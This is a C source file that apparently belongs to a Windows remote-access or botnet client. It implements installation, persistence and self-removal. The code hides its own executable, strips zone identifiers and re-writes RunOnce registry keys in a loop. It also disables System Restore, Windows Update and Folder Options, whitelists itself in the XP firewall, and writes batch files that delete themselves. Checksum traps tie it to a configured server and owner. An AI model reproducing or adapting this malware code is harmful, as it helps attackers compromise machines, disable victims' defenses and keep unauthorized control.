#include "../Includes/includes.h"

void UninstallFilesAndKeys()
{
    char cKeyName[DEFAULT];
    strcpy(cKeyName, "*");
    strcat(cKeyName, cFileHash);

    char cKeyPath[MAX_PATH];
    memset(cKeyPath, 0, sizeof(cKeyPath));
    strcpy(cKeyPath, cRegistryKeyToCurrentVersion);
    strcat(cKeyPath, "RunOnce");

    DeleteRegistryKey(HKEY_CURRENT_USER, cKeyPath, cKeyName);

    if(IsAdmin())
        DeleteRegistryKey(HKEY_LOCAL_MACHINE, cKeyPath, cKeyName);

    /*
    char cFileName[DEFAULT];
    for(unsigned short us = 0; us < 2; us++)
    {
        if(us == 0)
            sprintf(cFileName, "%s\\%s", cAllUsersStartupDirectory, GenerateFilename(0));
        else if(us == 1)
            sprintf(cFileName, "%s\\%s", cUserStartupDirectory, GenerateFilename(0));

        if(FileExists(cFileName))
        {
            SetFilePrivileges(cFileName, FILE_ALL_ACCESS, FALSE);
            SetFileNormal(cFileName);
            DeleteFile(cFileName);
        }
    }
    */

    SetFilePrivileges(cFileSaved, FILE_ALL_ACCESS, FALSE);
    SetFileNormal(cFileSaved);
    DeleteFile(cFileSaved);

    SetFilePrivileges(cFileSavedDirectory, FILE_ALL_ACCESS, FALSE);
    SetFileNormal(cFileSavedDirectory);
    DeleteFile(cFileSavedDirectory);

    for(unsigned short us = 0; us < 3; us++)
    {
        char cSisterPath[MAX_PATH];

        if(us == 0)
            strcpy(cSisterPath, cTempDirectory);
        else if(us == 1)
            strcpy(cSisterPath, cUserProfile);
        else if(us == 2)
        {
            if(dwOperatingSystem <= WINDOWS_XP)
                strcpy(cSisterPath, cUserProfile);
            else
                strcpy(cSisterPath, getenv("PROGRAMDATA"));
        }

        strcat(cSisterPath, "\\");
        strcat(cSisterPath, GenerateFilename(9));

        DeleteFile(cSisterPath);
    }

    char cUuidKeyPath[MAX_PATH];
    strcpy(cUuidKeyPath, "Software\\");
    strcat(cUuidKeyPath, cFileHash);
    DeleteRegistryKey(HKEY_CURRENT_USER, cUuidKeyPath, cFileHash);
}

#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
DWORD WINAPI InstallandPersist(LPVOID);

void StartInstallPersist()
{
    while(TRUE)
    {
        HANDLE hThread = CreateThread(NULL, NULL, InstallandPersist, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

bool SetMiscRegistryKeys()
{
    bool bReturn = FALSE;

    HKEY hKey = NULL;

    char cSubKeyOne[DEFAULT];
    strcpy(cSubKeyOne, cRegistryKeyToCurrentVersion);
    strcat(cSubKeyOne, "Explorer\\Advanced");
    char cKeyNameOne[DEFAULT];
    strcpy(cKeyNameOne, "Hidden");
    DWORD dwValueOne = 2;

    char cSubKeyTwo[DEFAULT];
    strcpy(cSubKeyTwo, cSubKeyOne);
    strcat(cSubKeyTwo, "\\Folder\\SuperHidden");
    char cKeyNameTwo[DEFAULT];
    strcpy(cKeyNameTwo, "CheckedValue");

    char cSubKeyThree[MAX_PATH];
    strcpy(cSubKeyThree, "Software\\Microsoft\\WindowsNT\\CurrentVersion\\SystemRestore");
    char cKeyNameThree[DEFAULT];
    strcpy(cKeyNameThree, "DisableSR");

    char cSubKeyFour[DEFAULT];
    strcpy(cSubKeyFour, cRegistryKeyToCurrentVersion);
    strcat(cSubKeyFour, "Policies\\Explorer");
    char cKeyNameFour[DEFAULT];
    strcpy(cKeyNameFour, "NoWindowsUpdate");

    char cSubKeyFive[DEFAULT];
    strcpy(cSubKeyFive, cSubKeyFour);
    char cKeyNameFive[DEFAULT];
    strcpy(cKeyNameFive, "NoFolderOptions");

    char cSubKeySix[DEFAULT];
    strcpy(cSubKeySix, cSubKeyTwo);
    char cKeyNameSix[DEFAULT];
    strcpy(cKeyNameSix, "ShowSuperHidden");

    for(unsigned short us = 0; us < 6; us++)
    {
        char cSubKey[DEFAULT];
        char cKeyName[DEFAULT];
        DWORD dwValue;

        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
        time_t tTime;
        struct tm *ptmTime;
        tTime = time(NULL);
        ptmTime = localtime(&tTime);
        char cTodaysDate[20];
        memset(cTodaysDate, 0, sizeof(cTodaysDate));
        strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
        if(atoi(cTodaysDate) >= nExpirationDateMedian)
            break;
        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

        if(us == 0)
        {
            strcpy(cSubKey, cSubKeyOne);
            strcpy(cKeyName, cKeyNameOne);
            dwValue = dwValueOne;
        }
        else if(us == 1)
        {
            strcpy(cSubKey, cSubKeyTwo);
            strcpy(cKeyName, cKeyNameTwo);
            dwValue = 1;
        }
        else if(us == 2)
        {
            strcpy(cSubKey, cSubKeyFour);
            strcpy(cKeyName, cKeyNameFour);
            dwValue = 1;
        }
        else if(us == 3)
        {
            strcpy(cSubKey, cSubKeyFive);
            strcpy(cKeyName, cKeyNameFive);
            dwValue = 1;
        }
        else if(us == 4)
        {
            strcpy(cSubKey, cSubKeySix);
            strcpy(cKeyName, cKeyNameSix);
            dwValue = 0;
        }

        if(RegOpenKeyExA(HKEY_CURRENT_USER, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, cKeyName, NULL, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }
    }

    if(IsAdmin())
    {
        char cSubKey[DEFAULT];
        char cKeyName[DEFAULT];

        strcpy(cSubKey, cSubKeyThree);
        strcpy(cKeyName, cKeyNameThree);
        DWORD dwValueDisableSR = 1;
        DWORD dwValueOthers = 0;

        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, cKeyName, NULL, REG_DWORD, (const BYTE*)&dwValueDisableSR, sizeof(dwValueDisableSR)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }

        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, "RPSessionInterval", NULL, REG_DWORD, (const BYTE*)&dwValueOthers, sizeof(dwValueOthers)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }

        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, "RPGlobalInterval", NULL, REG_DWORD, (const BYTE*)&dwValueOthers, sizeof(dwValueOthers)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }

        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, "RPLifeInterval", NULL, REG_DWORD, (const BYTE*)&dwValueOthers, sizeof(dwValueOthers)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }

        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, cSubKey, NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, "TimerInterval", NULL, REG_DWORD, (const BYTE*)&dwValueOthers, sizeof(dwValueOthers)) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }

        if(dwOperatingSystem == WINDOWS_XP)
        {
            if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
            {
                char cBuffer[300];
                memset(cBuffer, 0, sizeof(cBuffer));
                sprintf(cBuffer, "%s:*:Enabled:%s", cThisFile, ulFileHash);
                if(RegSetValueExA(hKey, cThisFile, NULL, REG_SZ, (const BYTE*)cBuffer, sizeof(cBuffer)) == ERROR_SUCCESS)
                    bReturn = TRUE;

                RegCloseKey(hKey);
            }
        }

         if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", NULL, KEY_WRITE, &hKey) == ERROR_SUCCESS)
        {
            if(RegSetValueExA(hKey, "0", NULL, REG_SZ, (const BYTE*)"xobv", 5) == ERROR_SUCCESS)
                bReturn = TRUE;

            RegCloseKey(hKey);
        }
    }

    return bReturn;
}

DWORD WINAPI InstallandPersist(LPVOID)
{
    bPersist = TRUE;
    UninstallFilesAndKeys();

    // <!-------! CRC AREA START !-------!>
    char cCheckString2[DEFAULT];
    sprintf(cCheckString2, "%s:%i", cServer, usPort);
    char *pcStr2 = cCheckString2;
    unsigned long ulCheck2 = 3376+2005;
    int nCheck2;
    while((nCheck2 = *pcStr2++))
        ulCheck2 = ((ulCheck2 << 5) + ulCheck2) + nCheck2;
    if(ulCheck2 != ulChecksum3)
    {
        while(true)
            UninstallFilesAndKeys();
    }
    // <!-------! CRC AREA STOP !-------!>

    bool bRunOnce = TRUE;
    char cNewFile[MAX_PATH];

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointFour)
        bPersist = false;
    // <!-------! CRC AREA STOP !-------!>

    while(bPersist)
    {
        SetMiscRegistryKeys();

        if(true)
        {
            // <!-------! CRC AREA START !-------!>
            char cCheckString[DEFAULT];
            sprintf(cCheckString, "%s--%s", cVersion, cOwner);
            char *cStr = cCheckString;
            unsigned long ulCheck = (((10000/100)*100)-4619);
            int nCheck;
            while((nCheck = *cStr++))
                ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
            if(ulCheck != ulChecksum2)
                return 0;
            // <!-------! CRC AREA STOP !-------!>
        }

        CreateDirectory(cFileSavedDirectory, NULL);
        HideFile(cFileSavedDirectory);

        SetFilePrivileges(cFileSaved, FILE_ALL_ACCESS, FALSE);

        if(bRunOnce)
        {
            //if(CopyFile(cThisFile, cFileSaved, FALSE))
            //HideFile(cFileSaved);

            MoveFileEx(cThisFile, cFileSaved, MOVEFILE_WRITE_THROUGH);
            HideFile(cFileSaved);
        }
        else
            HideFile(cFileSaved);

        DeleteZoneIdentifiers();

        if(bRunOnce)
        {
            char cStartupBatchFile[MAX_PATH];
            sprintf(cStartupBatchFile, "%s\\I%li.bat", cTempDirectory, ulFileHash);
            if(FileExists(cStartupBatchFile))
                ShellExecute(NULL, NULL, cStartupBatchFile, NULL, NULL, SW_HIDE);
            else
            {
                char cBatchFileName[DEFAULT];
                strcpy(cBatchFileName, cStartupBatchFile);

                char cBatchFileContents[DEFAULT * 2];
                //strcpy(cBatchFileContents, "@echo off\nSCHTASKS /CREATE /SC ONLOGON /TN A");

                //strcat(cBatchFileContents, cFileHash);

                //strcat(cBatchFileContents, " /TR ");
                //strcat(cBatchFileContents, cFileSaved);
                //strcat(cBatchFileContents, " /RL HIGHEST>NUL\nDEL %0>NUL\n");
                strcpy(cBatchFileContents, "@echo off\nDEL %0>NUL\n");

                FILE * fFile;
                fFile = fopen(cBatchFileName, "w");
                if(fFile != NULL)
                {
                    fputs(cBatchFileContents, fFile);
                    fclose(fFile);
                    ShellExecute(NULL, NULL, cBatchFileName, NULL, NULL, SW_HIDE);
                }
            }

            bRunOnce = FALSE;
        }

        char cSubKey[MAX_PATH];
        strcpy(cSubKey, cRegistryKeyToCurrentVersion);
        strcat(cSubKey, "RunOnce");

        char cKeyName[DEFAULT];
        strcpy(cKeyName, "*");
        strcat(cKeyName, cFileHash);

        char cKeyValue[MAX_PATH];
        strcpy(cKeyValue, cFileSaved);

        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s--%s", cVersion, cOwner);
        char *cStr = cCheckString;
        unsigned long ulCheck = (((10000/100)*100)-4619);
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum2)
            return 0;
        // <!-------! CRC AREA STOP !-------!>

        CreateRegistryKey(HKEY_CURRENT_USER, cSubKey, cKeyName, cKeyValue);

        if(IsAdmin())
        {
            strcpy(cRegistryKeyAccess, "HKLM");
            CreateRegistryKey(HKEY_LOCAL_MACHINE, cSubKey, cKeyName, cKeyValue);
        }
        else
            strcpy(cRegistryKeyAccess, "HKCU");

        Sleep(2500);
    }
    return 0;
}
#endif

void UninstallProgram()
{
#ifdef HTTP_BUILD
    if(nUninstallTaskId != 0)
    {
        while(!SendHttpCommandResponse(nUninstallTaskId, (char*)"0"))
            Sleep(10000);
    }
#endif

    bPersist = FALSE;
    SetProgramMutex(cUninstallProcessMutex);
    Sleep(GetRandNum(5000) + 2500);

    UninstallFilesAndKeys();

    SetFilePrivileges(cThisFile, FILE_ALL_ACCESS, FALSE);
    SetFileNormal(cThisFile);

    char cBatchFileName[MAX_PATH];
    sprintf(cBatchFileName, "%s\\U%li.bat", cTempDirectory, ulFileHash);

    char cBatchFileContents[DEFAULT * 2];
    //strcpy(cBatchFileContents, "@echo off\nDEL ");
    //strcat(cBatchFileContents, cThisFile);
    //strcat(cBatchFileContents, ">NUL\nSCHTASKS /DELETE /TN A");

    //strcat(cBatchFileContents, cFileHash);

    //strcat(cBatchFileContents, ">NUL\n");
    //strcat(cBatchFileContents, ":REPEAT\nDEL ");
    //strcat(cBatchFileContents, cThisFile);
    //strcat(cBatchFileContents, ">NUL\nif exist ");
    //strcat(cBatchFileContents, cThisFile);
    //strcat(cBatchFileContents, " goto REPEAT>NUL\nDEL %0>NUL\n");

    strcpy(cBatchFileContents, "@echo off\nDEL ");
    strcat(cBatchFileContents, cThisFile);
    strcat(cBatchFileContents, ">NUL\n");
    strcat(cBatchFileContents, ":REPEAT\nDEL ");
    strcat(cBatchFileContents, cThisFile);
    strcat(cBatchFileContents, ">NUL\nif exist ");
    strcat(cBatchFileContents, cThisFile);
    strcat(cBatchFileContents, " goto REPEAT>NUL\nDEL %0>NUL\n");

    FILE * fFile;
    fFile = fopen(cBatchFileName, "w");
    if(fFile != NULL)
    {
        fputs(cBatchFileContents, fFile);
        fclose(fFile);
        ShellExecute(NULL, NULL, cBatchFileName, NULL, NULL, SW_HIDE);
    }

    return;
}
